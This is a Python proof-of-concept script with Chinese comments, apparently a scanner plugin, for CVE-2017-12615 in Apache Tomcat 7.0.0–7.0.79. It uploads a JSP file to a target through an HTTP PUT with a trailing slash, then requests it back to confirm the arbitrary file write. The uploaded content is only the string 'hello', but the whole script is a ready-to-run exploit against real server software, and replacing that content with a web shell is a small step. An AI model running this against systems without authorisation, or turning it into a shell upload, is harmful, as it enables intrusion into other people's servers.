#已测试
#因为原理相同，与CVE_2017_12617共用同一个poc。

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import subprocess
import sys
import importlib

class DemoPOC:
    appName = 'Apache Tomcat'           # 漏洞影响的应用或组件名称
    appVersion = '7.0.0 - 7.0.79'       # 漏洞影响版本
    install_requires = ['requests']     # 需要的库
    CVE_ID = "CVE-2017-12615"           # CVE编号
    Vul_name = "Tomcat 任意文件读写漏洞"   # 漏洞名称
    Type = "Arbitrary File Write"        # 漏洞类型
    Description = "Apache Tomcat 7.0.0至7.0.79中存在一个任意文件写入漏洞。"  # 漏洞描述
    Script_type = "python"              # POC类型（暂时只支持python）
    Script = "CVE_2017_12615.py"        # POC文件名（包含后缀）
    Vul_Date = "2017-09-19"             # 漏洞公开日期

    def __init__(self, url, ip, port):
        self.url = url
        self.ip = ip
        self.port = port
        self.filename = '/hello.jsp'     # 上传的文件名
        self.data = 'hello'              # 上传文件内容

    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        missing_packages = []
        for package in self.install_requires:
            try:
                importlib.import_module(package)
            except ImportError:
                missing_packages.append(package)

        if missing_packages:
            print(f"Missing packages: {missing_packages}. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
                print(f"Successfully installed: {missing_packages}")
            except subprocess.CalledProcessError as e:
                print(f"[ERROR] Failed to install required packages: {e}")
                return False
        return True

    def _exploit(self):
        """
        上传文件，利用PUT请求尝试将JSP文件上传到目标系统。
        """
        target_url = f"http://{self.ip}:{self.port}{self.filename}/"
        try:
            response = requests.put(target_url, data=self.data)
            return response.status_code == 201 or response.status_code == 204
        except Exception as e:
            return f"[ERROR] {self.url} 连接失败: {e}"

    def checking(self):
        """
        验证文件是否成功上传并可以被访问。
        """
        target_url = f"http://{self.ip}:{self.port}{self.filename}"
        try:
            response = requests.get(target_url)
            if response.status_code == 200 and 'hello' in response.text:
                return f"[!] {self.url} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞"
            return "[SAFE] 文件上传失败或未被访问到"
        except Exception as e:
            return f"[ERROR] 文件验证失败: {e}"

    def _verify(self):
        """
        验证函数，检查漏洞是否存在。
        """
        result = {}
        try:
            # 检查是否安装所需库
            if not self.check_and_install_dependencies():
                result['Error'] = "[ERROR] 依赖库安装失败"
                return result

            # 调用 _exploit 上传文件
            upload_result = self._exploit()
            if isinstance(upload_result, str) and upload_result.startswith("[ERROR]"):
                result['Error'] = upload_result  # 上传过程中出现错误
            elif upload_result:
                # 调用 checking 函数，验证文件是否成功上传
                check_result = self.checking()
                result['VerifyInfo'] = check_result
            else:
                result['VerifyInfo'] = "[SAFE] 上传文件失败"
        except Exception as e:
            result['Error'] = f"[ERROR] 执行POC过程中发生错误: {str(e)}"

        return result


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python CVE_2017_12615.py <url> <ip> <port>")
        sys.exit(1)

    url = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])

    poc = DemoPOC(url, ip, port)
    result = poc._verify()
    print(result['VerifyInfo'] if 'VerifyInfo' in result else result['Error'])
